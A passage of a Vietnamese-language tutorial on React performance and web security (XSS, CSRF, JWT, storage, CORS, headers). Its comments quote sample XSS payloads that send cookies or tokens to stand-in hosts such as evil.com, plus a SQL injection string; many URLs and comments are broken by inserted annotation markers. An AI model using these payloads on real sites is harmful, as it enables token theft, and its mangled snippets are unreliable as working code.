  return <div>Biểu đồ trading...</div>;
}

 // Chú giải: 🧹 B. Cancel API Requests với AbortController
function OrderHistory() {
  const [orders, setOrders] = useState([]);

  useEffect(() => {
    // Tạo AbortController để cancel request
    const abortController = new AbortController();
    const signal = abortController.signal;

 // Chú giải: Fetch data với signal
    fetch('/api/orders?limit=1000', { signal })
      .then((res) => res.json())
      .then((data) => setOrders(data))
      .catch((error) => {
        // AbortError = request bị cancel (KHÔNG phải lỗi thật)
        if (error.name === 'AbortError') {
          console.log('Request đã được cancel');
        } else {
          console.error('Lỗi:', error);
        }
      });

 // Chú giải: ✅ Cleanup: Cancel request khi unmount
    return () => {
      console.log('Cancel API request...');
      abortController.abort(); // Cancel request đang chạy

 // Chú giải: Tại sao cần cancel?
      // - User chuyển trang nhanh → request cũ vẫn chạy → waste bandwidth
      // - Request trả về → update state unmounted component → memory leak
    };
  }, []);

  return <div>Lịch sử orders...</div>;
}

 // Chú giải: 🧹 C. Clear Timers & Intervals
function PriceRefresh() {
  const [price, setPrice] = useState(0);

  useEffect(() => {
    // Refresh giá mỗi 5 giây
    const intervalId = setInterval(() => {
      fetch('/api/price')
        .then((res) => res.json())
        .then((data) => setPrice(data.price));
    }, 5000);

 // Chú giải: ✅ Cleanup: Clear interval khi unmount
    return () => {
      console.log('Clear interval...');
      clearInterval(intervalId); // Chú giải: Dừng interval

      // Nếu không clear:
 // Chú giải: - Interval vẫn chạy sau unmount → call API → update state
      // - Memory leak + nhiều intervals chạy song song
    };
  }, []);

  return <div>Giá hiện tại: ${price}</div>;
}

 // Chú giải: 🧹 D. Remove Event Listeners
function ResizableChart() {
  const chartRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
 // Chú giải: Handler cho window resize
    const handleResize = () => {
      if (chartRef.current) {
        // Resize chart khi window thay đổi
        console.log('Resize chart to:', window.innerWidth);
      }
    };

    // Đăng ký event listener
    window.addEventListener('resize', handleResize);

 // Chú giải: ✅ Cleanup: Remove event listener
    return () => {
      console.log('Remove resize listener...');
      window.removeEventListener('resize', handleResize);

      // Nếu không remove:
 // Chú giải: - Listener vẫn tồn tại sau unmount
      // - Nhiều components → nhiều listeners → performance giảm
      // - Memory leak (function + closure không được garbage collected)
    };
  }, []);

  return <div ref={chartRef}>Chart có thể resize</div>;
}
// Kết quả cleanup đúng cách: Memory ổn định ~80MB thay vì leak đến 500MB

```js
// Ví dụ rút gọn
const example = 42;
```

┌────────────────────────────────────────────────────────────────┐
│           PERFORMANCE METRICS - BEFORE vs AFTER                 │
├────────────────────────────────────────────────────────────────┤
│  Metric              │ Before      │ After       │ Improvement │
│ ─────────────────────┼─────────────┼─────────────┼──────────── │
│  Initial Load        │ 5-7s        │ 1.5-2s      │ 70% faster  │
│  Bundle Size         │ 2.5MB       │ 450KB       │ 82% smaller │
│  FCP (First Paint)   │ 3s          │ 0.8s        │ 73% faster  │
│  TTI (Interactive)   │ 6s          │ 2s          │ 67% faster  │
│  Scroll FPS          │ 15 FPS      │ 60 FPS      │ 4x better   │
│  Memory Usage        │ 500MB       │ 80MB        │ 84% less    │
│  Re-renders/sec      │ 200+        │ 10-20       │ 90% less    │
└────────────────────────────────────────────────────────────────┘

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ❌ LỖI 1: Inline functions trong render
// Vấn đề: Mỗi render tạo function mới → child component re-render không cần thiết
{
  items.map((item) => (
    <Item
      key={item.id}
      onClick={() => handleClick(item)} // Chú giải: ❌ Function mới mỗi lần render
    />
  ));
}

// ✅ CÁCH SỬA: Dùng useCallback để memoize function
const handleClick = useCallback((item) => {
  console.log('Clicked:', item);
  // Xử lý logic...
}, []); // Function reference không đổi

{
  items.map((item) => (
    <Item
      key={item.id}
      onClick={handleClick} // ✅ Reference giống nhau → không re-render
      item={item}
    />
  ));
}

// ❌ LỖI 2: Không cleanup useEffect → Memory Leak
useEffect(() => {
  const ws = new WebSocket('wss: // Chú giải: api.example.com');
  ws.onmessage = (e) => setData(e.data);
  // ❌ Thiếu cleanup → WebSocket không đóng → memory leak
}, []);

// ✅ CÁCH SỬA: Luôn cleanup resources
useEffect(() => {
  const ws = new WebSocket('wss: // Chú giải: api.example.com');
  ws.onmessage = (e) => setData(e.data);

  return () => {
    ws.close(); // ✅ Đóng WebSocket khi unmount
  };
}, []);

// ❌ LỖI 3: Quên dependencies trong useMemo/useCallback
const sortedData = useMemo(() => {
  return data.sort((a, b) => a[sortBy] - b[sortBy]);
}, []); // ❌ Thiếu [data, sortBy] → không update khi data/sortBy thay đổi

// ✅ CÁCH SỬA: Khai báo đầy đủ dependencies
const sortedData = useMemo(() => {
  return data.sort((a, b) => a[sortBy] - b[sortBy]);
}, [data, sortBy]); // ✅ Tính lại khi data hoặc sortBy thay đổi

// ❌ LỖI 4: Render toàn bộ list lớn
function OrderList({ orders }) {
  return (
    <div>
      {orders.map((order) => (
        <OrderRow key={order.id} order={order} />
      ))}
    </div>
  );
} // Chú giải: ❌ 10,000 items → 10,000 DOM nodes → lag

// ✅ CÁCH SỬA: Dùng virtual scrolling
import { FixedSizeList } from 'react-window';

function OrderList({ orders }) {
  return (
    <FixedSizeList height={600} itemCount={orders.length} itemSize={50}>
      {({ index, style }) => (
        <div style={style}>
          <OrderRow order={orders[index]} />
        </div>
      )}
    </FixedSizeList>
  );
} // ✅ Chỉ render ~12 items → mượt mà

```js
// Ví dụ rút gọn
const example = 42;
```

js
 // Chú giải: ❌ Vulnerable
   <div dangerouslySetInnerHTML={{ __html: userInput }} />
 // Chú giải: ✅ Safe
   import DOMPurify from 'dompurify';
   <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />

```js
// Ví dụ rút gọn
const example = 42;
```

js
 // Chú giải: Server (Express)
   app.use(cors({ origin: 'https: // Chú giải: trusted-domain.com' }));

```js
// Ví dụ rút gọn
const example = 42;
```

┌──────────────────────────────────────────────────────────────┐
│              WEB SECURITY LAYERS                              │
├──────────────────────────────────────────────────────────────┤
│  1️⃣ HTTPS + TLS (Transport Layer Security)                  │
│  2️⃣ XSS Prevention (Cross-Site Scripting)                   │
│  3️⃣ CSRF Protection (Cross-Site Request Forgery)            │
│  4️⃣ Authentication & Authorization                          │
│  5️⃣ Secure Storage                                          │
│  6️⃣ API Security                                            │
│  7️⃣ Security Headers                                        │
└──────────────────────────────────────────────────────────────┘

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ============================================
// 1️⃣ HTTPS + TLS (BẢO MẬT TẦNG TRUYỀN TẢI)
 // Chú giải: ============================================

// Giải thích: HTTPS mã hóa dữ liệu giữa browser ↔ server
// Ngăn Man-in-the-Middle attack (hacker không đọc được data)

// Cấu hình Nginx Server
server {
  listen 443 ssl http2; // Chú giải: Port 443 = HTTPS, http2 = protocol mới nhanh hơn

  # HSTS (HTTP Strict Transport Security): Bắt buộc dùng HTTPS
  # Giải thích: Browser tự động chuyển HTTP → HTTPS trong 1 năm
  # includeSubDomains: Áp dụng cho tất cả subdomain (api.example.com, cdn.example.com)
  # preload: Đưa vào HSTS preload list của browser (bảo mật từ lần truy cập đầu)
  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

  # Cấu hình SSL/TLS Certificate (Chứng chỉ bảo mật)
  ssl_certificate /path/to/cert.pem;          # Public certificate (chứng chỉ công khai)
  ssl_certificate_key /path/to/key.pem;       # Private key (khóa bí mật)

  # Chỉ cho phép TLS 1.2 và 1.3 (phiên bản mới, bảo mật)
  # Không dùng TLS 1.0, 1.1 (đã lỗi thời, có lỗ hổng)
  ssl_protocols TLSv1.2 TLSv1.3;

  # Cipher suite: Thuật toán mã hóa
  # HIGH = mã hóa mạnh, !aNULL = không dùng cipher không xác thực, !MD5 = không dùng MD5 (yếu)
  ssl_ciphers HIGH:!aNULL:!MD5;
}

 // Chú giải: ============================================
// 2️⃣ XSS PREVENTION (NGĂN CHẶN TẤN CÔNG XSS)
 // Chú giải: ============================================

// Giải thích XSS (Cross-Site Scripting):
// Hacker inject malicious script vào web → script chạy → steal cookies, redirect, keylog
 // Chú giải: VD: User nhập comment: <script>fetch('https://hacker.com?cookie='+document.cookie)</script>

// 🛡️ A. Input Sanitization (Làm Sạch Input) với DOMPurify
import DOMPurify from 'dompurify';
import { useState, useMemo } from 'react';

function CommentForm({ onSubmit }) {
  const [comment, setComment] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // ✅ Sanitize input: Loại bỏ script tags và các thẻ nguy hiểm
    const sanitized = DOMPurify.sanitize(comment, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],  // Chỉ cho phép các thẻ an toàn
      ALLOWED_ATTR: ['href']  // Chỉ cho phép attribute 'href' (cho thẻ <a>)
    });
    // Kết quả: "<script>alert('xss')</script>" → "" (bị xóa)
 // Chú giải: "<b>Text</b>" → "<b>Text</b>" (giữ lại)

    onSubmit(sanitized);
  };

  return (
    <form onSubmit={handleSubmit}>
      <textarea
        value={comment}
        onChange={(e) => setComment(e.target.value)}
        placeholder="Nhập comment của bạn..."
      />
      <button type="submit">Gửi Comment</button>
    </form>
  );
}

// ✅ Safe Display: Hiển thị HTML an toàn
function SafeComment({ content }) {
  // useMemo: Chỉ sanitize lại khi content thay đổi
  const sanitized = useMemo(() => {
    return DOMPurify.sanitize(content, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],  // Cho phép format text cơ bản
      ALLOWED_ATTR: ['href', 'target'],  // Cho phép link
      ALLOW_DATA_ATTR: false  // Không cho phép data-* attributes (có thể chứa script)
    });
  }, [content]);

 // Chú giải: dangerouslySetInnerHTML: Render HTML string
  // Tên "dangerous" nhắc nhở phải sanitize trước khi dùng
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// ❌ VÍ DỤ TẤN CÔNG XSS:
 // Chú giải: User nhập: <img src="x" onerror="alert('XSS')">
// Không sanitize → img load lỗi → chạy onerror → alert hiện
// Có sanitize → DOMPurify xóa onerror attribute → an toàn

// 🛡️ B. Content Security Policy (CSP) - Chính sách bảo mật nội dung
// CSP: Header chỉ định nguồn nào được phép load scripts, styles, images
 // Chú giải: Server: Express.js
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    [
      "default-src 'self'",  // Mặc định chỉ load từ cùng domain
      "script-src 'self' https: // Chú giải: trusted-cdn.com",  // Script chỉ từ domain + CDN tin cậy
      "style-src 'self' 'unsafe-inline'", // Chú giải: CSS từ domain + inline styles (cần cho React)
      "img-src 'self' data: https:", // Chú giải: Image từ domain + data URLs + HTTPS
      "connect-src 'self' https://api.example.com",  // Fetch/WebSocket chỉ đến API
      "frame-ancestors 'none'"  // Không cho embed trong iframe (chống clickjacking)
    ].join('; ')
  );
  next();
});
// Kết quả: Nếu hacker inject <script src="https://evil.com/hack.js"></script>
// → Browser BLOCK vì evil.com không trong whitelist → XSS thất bại

 // Chú giải: ============================================
// 3️⃣ CSRF PROTECTION (NGĂN CHẶN TẤN CÔNG CSRF)
 // Chú giải: ============================================

// Giải thích CSRF (Cross-Site Request Forgery):
// Hacker lừa user click link → browser tự động gửi request (kèm cookies) → thực hiện action không mong muốn
// VD: User đang login bank.com → click link evil.com → evil.com trigger POST /transfer → tiền bị chuyển

import { useEffect, useState } from 'react';
import { randomBytes } from 'crypto';

 // Chú giải: SERVER: Generate CSRF Token
// Tạo token ngẫu nhiên cho mỗi session, lưu ở server
app.get('/api/csrf-token', (req, res) => {
  // Tạo token ngẫu nhiên 32 bytes (256 bits) → rất khó đoán
  const token = randomBytes(32).toString('hex');

  // Lưu token vào session (server-side, hacker không access được)
  req.session.csrfToken = token;

 // Chú giải: Trả token cho client
  res.json({ csrfToken: token });
});

// API endpoint cần bảo vệ
app.post('/api/transfer', (req, res) => {
  const { csrfToken, amount, toAccount } = req.body;

  // ✅ Verify CSRF token: So sánh token từ client vs token trong session
  if (csrfToken !== req.session.csrfToken) {
    console.log('❌ CSRF token không hợp lệ');
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  // Token hợp lệ → xử lý transfer
  console.log(`✅ Chuyển $${amount} đến ${toAccount}`);
 // Chú giải: Process transfer logic...
  res.json({ success: true });
});

 // Chú giải: CLIENT: Hook lấy CSRF token
function useCsrfToken() {
  const [csrfToken, setCsrfToken] = useState('');

  useEffect(() => {
 // Chú giải: Fetch token từ server khi component mount
    fetch('/api/csrf-token')
      .then(res => res.json())
      .then(data => setCsrfToken(data.csrfToken))
      .catch(err => console.error('Lỗi lấy CSRF token:', err));
  }, []);

  return csrfToken;
}

// Component Form chuyển tiền
function TransferForm() {
  const csrfToken = useCsrfToken(); // Chú giải: Lấy token
  const [amount, setAmount] = useState('');
  const [toAccount, setToAccount] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // ✅ Gửi CSRF token cùng request
    // Cách 1: Trong body
    // Cách 2: Trong custom header (X-CSRF-Token)
    await fetch('/api/transfer', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken // Chú giải: Gửi token qua header
      },
      body: JSON.stringify({
        amount,
        toAccount,
        csrfToken  // Cũng gửi trong body (double check)
      })
    });
  };

  return (
    <form onSubmit={handleSubmit}>
      <input
        type="number"
        value={amount}
        onChange={(e) => setAmount(e.target.value)}
        placeholder="Số tiền"
      />
      <input
        type="text"
        value={toAccount}
        onChange={(e) => setToAccount(e.target.value)}
        placeholder="Tài khoản nhận"
      />
      <button type="submit">Chuyển Tiền</button>
    </form>
  );
}

// TẠI SAO CSRF TOKEN HOẠT ĐỘNG?
// 1. Site evil.com KHÔNG thể đọc token từ bank.com (Same-Origin Policy)
// 2. Browser tự động gửi cookies → nhưng KHÔNG tự động gửi custom headers/body
// 3. Request từ evil.com thiếu token → server reject → CSRF thất bại

 // Chú giải: ============================================
// 4️⃣ AUTHENTICATION & AUTHORIZATION (XÁC THỰC & PHÂN QUYỀN)
 // Chú giải: ============================================

// Giải thích JWT (JSON Web Token):
// Token chứa thông tin user (id, email, role) được mã hóa
// Server ký token bằng secret key → client không thể fake token
// 2 loại token: Access Token (ngắn hạn) + Refresh Token (dài hạn)

import jwt from 'jsonwebtoken';
import bcrypt from 'bcrypt';

 // Chú giải: SERVER: Login API
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;

  // Tìm user trong database
  const user = await User.findOne({ email });

  if (!user) {
    return res.status(401).json({ error: 'Email không tồn tại' });
  }

  // Verify password (so sánh với hash trong DB)
  const validPassword = await bcrypt.compare(password, user.passwordHash);

  if (!validPassword) {
    return res.status(401).json({ error: 'Mật khẩu không đúng' });
  }

  // ✅ Generate Access Token (Token truy cập - ngắn hạn: 15 phút)
  // Tại sao ngắn hạn? Nếu bị đánh cắp → hacker chỉ dùng được 15 phút
  const accessToken = jwt.sign(
    { userId: user.id, email: user.email, role: user.role },  // Payload: thông tin user
    process.env.JWT_SECRET!,  // Secret key để ký token (giữ bí mật)
    { expiresIn: '15m' }  // Token hết hạn sau 15 phút
  );

  // ✅ Generate Refresh Token (Token làm mới - dài hạn: 7 ngày)
  // Dùng để lấy access token mới khi access token hết hạn
  const refreshToken = jwt.sign(
    { userId: user.id },  // Payload đơn giản hơn
    process.env.REFRESH_TOKEN_SECRET!,  // Secret key khác với access token
    { expiresIn: '7d' }  // 7 ngày
  );

  // ✅ Lưu refresh token vào httpOnly cookie
  // httpOnly: JavaScript KHÔNG đọc được → XSS không steal được
 // Chú giải: secure: Chỉ gửi qua HTTPS
  // sameSite: 'strict' → chống CSRF (cookie không gửi từ site khác)
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,  // JS không access được (chống XSS)
    secure: true, // Chú giải: Chỉ gửi qua HTTPS
    sameSite: 'strict', // Chú giải: Chống CSRF
    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 ngày (milliseconds)
  });

  // Trả access token cho client (lưu trong memory, KHÔNG localStorage)
  res.json({ accessToken, user: { id: user.id, email: user.email } });
});

// API làm mới access token
app.post('/api/refresh', async (req, res) => {
  const { refreshToken } = req.cookies;

  if (!refreshToken) {
    return res.status(401).json({ error: 'Không có refresh token' });
  }

  try {
 // Chú giải: Verify refresh token
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET!);

 // Chú giải: Generate access token mới
    const newAccessToken = jwt.sign(
      { userId: decoded.userId },
      process.env.JWT_SECRET!,
      { expiresIn: '15m' }
    );

    res.json({ accessToken: newAccessToken });
  } catch (error) {
    res.status(403).json({ error: 'Refresh token không hợp lệ' });
  }
});

 // Chú giải: CLIENT: Auth Context với auto-refresh
import { createContext, useContext, useEffect, useState } from 'react';

const AuthContext = createContext<{ accessToken: string | null }>({ accessToken: null });

function AuthProvider({ children }) {
  const [accessToken, setAccessToken] = useState<string | null>(null);

  // ✅ Auto-refresh token trước khi hết hạn
  // Access token hết hạn sau 15 phút → refresh sau 14 phút (dư 1 phút buffer)
  useEffect(() => {
    const refreshInterval = setInterval(async () => {
      console.log('Đang refresh access token...');

      const res = await fetch('/api/refresh', {
        method: 'POST',
        credentials: 'include' // Chú giải: Gửi cookies (chứa refresh token)
      });

      if (res.ok) {
        const data = await res.json();
        setAccessToken(data.accessToken); // Chú giải: Update access token mới
        console.log('✅ Access token đã được làm mới');
      } else {
        console.log('❌ Refresh thất bại → User cần login lại');
        setAccessToken(null);
      }
    }, 14 * 60 * 1000); // 14 phút = 840,000ms

 // Chú giải: Cleanup interval khi unmount
    return () => clearInterval(refreshInterval);
  }, []);

  return (
    <AuthContext.Provider value={{ accessToken }}>
      {children}
    </AuthContext.Provider>
  );
}

 // Chú giải: Hook sử dụng auth
export const useAuth = () => useContext(AuthContext);

 // Chú giải: Component gọi API với authentication
function UserProfile() {
  const { accessToken } = useAuth();
  const [profile, setProfile] = useState(null);

  useEffect(() => {
    if (accessToken) {
      fetch('/api/profile', {
        headers: {
          'Authorization': `Bearer ${accessToken}` // Chú giải: Gửi access token trong header
        }
      })
        .then(res => res.json())
        .then(data => setProfile(data));
    }
  }, [accessToken]);

  return <div>Thông tin user: {profile?.email}</div>;
}

 // Chú giải: ============================================
// 5️⃣ SECURE STORAGE (LƯU TRỮ AN TOÀN)
 // Chú giải: ============================================

// Nguyên tắc: KHÔNG BAO GIỜ lưu sensitive data ở client-side (localStorage/sessionStorage)
// Lý do: XSS attack có thể đọc localStorage → steal tokens, passwords, credit cards

// ❌ CÁCH LƯU KHÔNG AN TOÀN
// localStorage/sessionStorage: JavaScript có thể đọc → XSS steal được
localStorage.setItem('token', accessToken); // ❌ XSS đọc được!
localStorage.setItem('refreshToken', refreshToken); // ❌ Rất nguy hiểm!
localStorage.setItem('creditCard', '1234-5678-9012-3456'); // ❌ KHÔNG BAO GIỜ làm!
localStorage.setItem('password', 'user123'); // ❌ Cực kỳ nguy hiểm!

// Kịch bản tấn công:
 // Chú giải: 1. Hacker inject XSS: <script>fetch('https://evil.com?data='+localStorage.getItem('token'))</script>
// 2. Script chạy → đọc localStorage → gửi token về server hacker
// 3. Hacker dùng token → truy cập account của user

// ✅ CÁCH LƯU AN TOÀN

 // Chú giải: 1. HttpOnly Cookies cho Refresh Token (bảo mật nhất)
// httpOnly: JavaScript KHÔNG thể đọc → XSS không steal được
 // Chú giải: Server set cookie trong response:
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,    // ✅ JS không access được
  secure: true, // Chú giải: ✅ Chỉ gửi qua HTTPS
  sameSite: 'strict', // Chú giải: ✅ Chống CSRF
  maxAge: 7 * 24 * 60 * 60 * 1000  // 7 ngày
});

// Client không thể đọc cookie này:
console.log(document.cookie); // Không thấy refreshToken (vì httpOnly)

 // Chú giải: 2. Memory-only cho Access Token (lưu trong React state/context)
 // Chú giải: Access token chỉ tồn tại trong memory → mất khi reload page
function App() {
  const [accessToken, setAccessToken] = useState<string | null>(null);

  // Khi login thành công
  const handleLogin = async (email: string, password: string) => {
    const res = await fetch('/api/login', {
      method: 'POST',
      body: JSON.stringify({ email, password })
    });

    const data = await res.json();
    setAccessToken(data.accessToken); // Chú giải: ✅ Lưu trong memory (React state)
    // KHÔNG lưu vào localStorage
  };

  return <div>App content...</div>;
}

// 3. Session Storage (tốt hơn localStorage nhưng vẫn có risk)
// sessionStorage: Tồn tại trong 1 tab, mất khi đóng tab
// Vẫn có thể bị XSS steal → chỉ dùng cho non-sensitive data
sessionStorage.setItem('theme', 'dark'); // ✅ OK cho data không nhạy cảm
sessionStorage.setItem('language', 'vi'); // Chú giải: ✅ OK

// ❌ KHÔNG dùng cho sensitive data
sessionStorage.setItem('token', token); // ❌ Vẫn có XSS risk

// 4. Encrypted Storage (Mã hóa trước khi lưu - fallback option)
// Chỉ dùng khi BẮT BUỘC phải lưu client-side
import CryptoJS from 'crypto-js';

const SECRET_KEY = 'your-encryption-key'; // Lấy từ env hoặc server

 // Chú giải: Encrypt trước khi lưu
const encryptData = (data: string) => {
  return CryptoJS.AES.encrypt(data, SECRET_KEY).toString();
};

// Decrypt khi đọc
const decryptData = (encrypted: string) => {
  const bytes = CryptoJS.AES.decrypt(encrypted, SECRET_KEY);
  return bytes.toString(CryptoJS.enc.Utf8);
};

// Lưu data đã mã hóa
const encrypted = encryptData(sensitiveData);
localStorage.setItem('data', encrypted);

// Đọc và giải mã
const encrypted = localStorage.getItem('data');
const decrypted = decryptData(encrypted);

// ⚠️ LƯU Ý: Encryption KHÔNG an toàn 100%
// - Secret key vẫn ở client → hacker có thể tìm thấy
// - Chỉ làm khó hacker hơn, KHÔNG ngăn được hoàn toàn

// 📋 BẢNG SO SÁNH STORAGE OPTIONS
/*
┌──────────────────────┬─────────────┬─────────────┬──────────────────┐
│ Storage Type         │ XSS Risk    │ CSRF Risk   │ Best Use Case    │
├──────────────────────┼─────────────┼─────────────┼──────────────────┤
│ HttpOnly Cookie      │ ✅ Low      │ ⚠️ Medium   │ Refresh Token    │
│ Memory (React State) │ ✅ Low      │ ✅ Low      │ Access Token     │
│ localStorage         │ ❌ High     │ ✅ Low      │ Non-sensitive    │
│ sessionStorage       │ ❌ High     │ ✅ Low      │ Non-sensitive    │
│ Encrypted Storage    │ ⚠️ Medium   │ ✅ Low      │ Fallback only    │
└──────────────────────┴─────────────┴─────────────┴──────────────────┘
*/

 // Chú giải: ✅ BEST PRACTICE:
 // Chú giải: - Refresh Token → httpOnly cookie (server-side)
 // Chú giải: - Access Token → React state/Context (memory)
 // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
 // Chú giải: - NEVER store passwords, credit cards, API keys trong client

 // Chú giải: ============================================
 // Chú giải: 6️⃣ API SECURITY (BẢO MẬT API)
 // Chú giải: ============================================

 // Chú giải: 🛡️ A. Rate Limiting (Giới Hạn Số Request)
// Mục đích: Ngăn DDoS attack, brute-force attack, spam
// VD: Hacker thử 1 triệu passwords → rate limit chặn sau 5 lần thử

const rateLimit = require('express-rate-limit');

// Rate limiter cho toàn bộ API
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // Cửa sổ thời gian: 15 phút
  max: 100, // Tối đa 100 requests trong 15 phút (từ 1 IP)
  message: 'Quá nhiều requests, vui lòng thử lại sau',
  standardHeaders: true, // Trả về RateLimit headers (X-RateLimit-*)
  legacyHeaders: false,  // Tắt headers cũ
});

// Áp dụng cho tất cả API routes
app.use('/api/', apiLimiter);

// Rate limiter nghiêm ngặt hơn cho login (chống brute-force)
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 phút
  max: 5, // Chỉ cho 5 lần thử login trong 15 phút
  message: 'Quá nhiều lần thử login, tài khoản tạm khóa 15 phút',
  skipSuccessfulRequests: true // Không đếm request thành công
});

app.post('/api/login', loginLimiter, async (req, res) => {
 // Chú giải: Login logic...
});

// 🛡️ B. Input Validation (Kiểm Tra Dữ Liệu Đầu Vào)
// Nguyên tắc: KHÔNG BAO GIỜ tin tưởng input từ client
// Luôn validate ở server-side (client validation có thể bị bypass)

import { z } from 'zod'; // Thư viện validation mạnh mẽ

 // Chú giải: Schema cho transfer request
const transferSchema = z.object({
  amount: z.number()
    .positive('Số tiền phải > 0')  // Phải là số dương
    .max(1000000, 'Số tiền tối đa 1 triệu'),  // Giới hạn trên

  accountNumber: z.string()
    .regex(/^\d{10}$/, 'Số tài khoản phải có 10 chữ số'),  // Đúng format

  description: z.string()
    .max(200, 'Mô tả tối đa 200 ký tự')
    .optional()  // Field không bắt buộc
});

 // Chú giải: API endpoint với validation
app.post('/api/transfer', async (req, res) => {
  try {
 // Chú giải: ✅ Validate input với Zod
    const data = transferSchema.parse(req.body);

    // Validation pass → data đã clean và đúng type
    console.log('✅ Data hợp lệ:', data);

    // Xử lý transfer với data đã validate
    const result = await processTransfer(data);

    res.json({ success: true, result });

  } catch (error) {
    // Validation fail → trả lỗi chi tiết
    if (error instanceof z.ZodError) {
      console.log('❌ Validation errors:', error.errors);
      return res.status(400).json({
        error: 'Dữ liệu không hợp lệ',
        details: error.errors
      });
    }

    res.status(500).json({ error: 'Lỗi server' });
  }
});

// 🛡️ C. CORS Configuration (Kiểm Soát Nguồn Gốc Requests)
// CORS: Quy định domain nào được phép call API
import cors from 'cors';

// CORS config nghiêm ngặt
const corsOptions = {
  origin: [
    'https: // Chú giải: yourdomain.com',      // Production domain
    'https: // Chú giải: staging.yourdomain.com', // Staging
  ],
  // KHÔNG dùng origin: '*' trong production (cho phép mọi domain)

  methods: ['GET', 'POST', 'PUT', 'DELETE'], // HTTP methods cho phép

  allowedHeaders: [
    'Content-Type',
    'Authorization',
    'X-CSRF-Token'
  ], // Headers cho phép

  credentials: true, // Cho phép gửi cookies

  maxAge: 86400 // Chú giải: Cache preflight request 24h
};

app.use(cors(corsOptions));

// 🛡️ D. SQL Injection Prevention (Ngăn Chặn SQL Injection)
// LUÔN dùng parameterized queries, KHÔNG nối string SQL

// ❌ KHÔNG AN TOÀN: String concatenation
const userId = req.params.id;
const query = `SELECT * FROM users WHERE id = ${userId}`; // Chú giải: XSS: userId = "1 OR 1=1"
db.query(query); // ❌ Trả về tất cả users!

// ✅ AN TOÀN: Parameterized query
const userId = req.params.id;
const query = 'SELECT * FROM users WHERE id = ?'; // Chú giải: Placeholder
db.query(query, [userId]); // ✅ Library tự động escape

// 🛡️ E. API Authentication (Xác Thực API)
// Middleware kiểm tra token
const authenticateToken = (req, res, next) => {
 // Chú giải: Lấy token từ header
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1]; // Chú giải: "Bearer TOKEN"

  if (!token) {
    return res.status(401).json({ error: 'Thiếu access token' });
  }

  try {
 // Chú giải: Verify token
    const decoded = jwt.verify(token, process.env.JWT_SECRET!);
    req.user = decoded; // Gắn user info vào request
    next(); // Token hợp lệ → tiếp tục
  } catch (error) {
    return res.status(403).json({ error: 'Token không hợp lệ hoặc hết hạn' });
  }
};

// Áp dụng middleware cho protected routes
app.get('/api/profile', authenticateToken, (req, res) => {
  // req.user đã có thông tin từ token
  res.json({ user: req.user });
});

app.post('/api/transfer', authenticateToken, apiLimiter, async (req, res) => {
 // Chú giải: Multiple layers: Authentication + Rate limiting + Validation
 // Chú giải: ...
});

 // Chú giải: ============================================
 // Chú giải: 7️⃣ SECURITY HEADERS (HEADERS BẢO MẬT)
 // Chú giải: ============================================

// Security Headers: HTTP response headers tăng cường bảo mật
// Helmet.js: Thư viện tự động set các security headers

import helmet from 'helmet';
import express from 'express';

const app = express();

// Áp dụng Helmet với config chi tiết
app.use(helmet({

  // 1. Content Security Policy (CSP) - Kiểm soát nguồn tài nguyên
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],  // Mặc định chỉ load từ cùng origin

      scriptSrc: [
        "'self'",  // Scripts từ cùng domain
        "'unsafe-inline'",  // Cho phép inline scripts (cần cho React)
        "https: // Chú giải: trusted-cdn.com"  // CDN tin cậy
      ],

      styleSrc: [
        "'self'",
        "'unsafe-inline'" // Chú giải: Inline styles (cần cho styled-components)
      ],

      imgSrc: [
        "'self'", // Chú giải: Images từ domain
        "data:", // Chú giải: Data URLs (base64 images)
        "https:" // Chú giải: HTTPS images
      ],

      connectSrc: [
        "'self'", // Chú giải: Fetch/WebSocket từ domain
        "https: // Chú giải: api.example.com"  // API endpoints
      ],

      fontSrc: ["'self'", "https: // Chú giải: fonts.gstatic.com"],

      objectSrc: ["'none'"],  // Không cho phép <object>, <embed>

      mediaSrc: ["'self'"], // Chú giải: Video/Audio

      frameSrc: ["'none'"]  // Không cho phép iframe
    }
  },

 // Chú giải: 2. X-Frame-Options - Chống Clickjacking
  // Clickjacking: Hacker nhúng site vào iframe, lừa user click vào button ẩn
  xFrameOptions: {
    action: 'deny'  // Không cho phép site được nhúng trong iframe
  },
  // Hoặc: action: 'sameorigin' (chỉ iframe từ cùng domain)

 // Chú giải: 3. X-Content-Type-Options - Chống MIME type sniffing
  // noSniff: true → Browser không đoán MIME type, phải dùng đúng Content-Type
  noSniff: true,
  // VD: File .txt có MIME text/plain → browser KHÔNG execute như JavaScript

  // 4. Referrer-Policy - Kiểm soát thông tin Referrer
  referrerPolicy: {
    policy: 'no-referrer'  // Không gửi referrer header (giấu nguồn gốc request)
  },
  // Các option khác: 'no-referrer-when-downgrade', 'same-origin', 'strict-origin'

 // Chú giải: 5. X-XSS-Protection (Legacy, CSP tốt hơn)
  xssFilter: true, // Chú giải: Enable XSS filter built-in của browser

 // Chú giải: 6. Strict-Transport-Security (HSTS)
  hsts: {
    maxAge: 31536000,  // 1 năm (giây)
    includeSubDomains: true,  // Áp dụng cho subdomain
    preload: true  // Đưa vào HSTS preload list
  }

}));

// Hoặc set headers thủ công
app.use((req, res, next) => {
 // Chú giải: CSP Header
